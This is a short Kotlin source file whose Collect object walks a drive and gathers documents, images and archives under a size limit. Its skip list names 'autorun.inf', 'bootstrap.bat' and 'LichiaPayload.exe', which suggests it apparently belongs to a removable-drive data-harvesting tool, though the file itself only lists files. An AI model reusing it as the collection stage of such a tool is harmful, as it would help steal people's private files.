package br.com.lichia.app

import java.io.File

object Collect {
    val DOCS = setOf(
        "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv",
        "jpg", "jpeg", "png", "zip", "rar", "7z")
    val SKIP = setOf(
        "System Volume Information", "$RECYCLE.BIN", "Lichia",
        Prefs.MARKER, "bootstrap.bat", "autorun.inf", "LichiaPayload.exe")

    fun files(root: File, cfg: Prefs.Cfg): List<Pair<String, File>> {
        val maxBytes = cfg.maxMb.toLong() * 1024 * 1024
        val out = ArrayList<Pair<String, File>>()
        root.walkTopDown()
            .onEnter { dir -> dir.name !in SKIP }
            .filter { it.isFile && it.name !in SKIP }
            .forEach { p ->
                if (p.length() > maxBytes) return@forEach
                if (cfg.mode == "docs" && p.extension.lowercase() !in DOCS) return@forEach
                out.add(p.relativeTo(root).path to p)
            }
        return out
    }
}
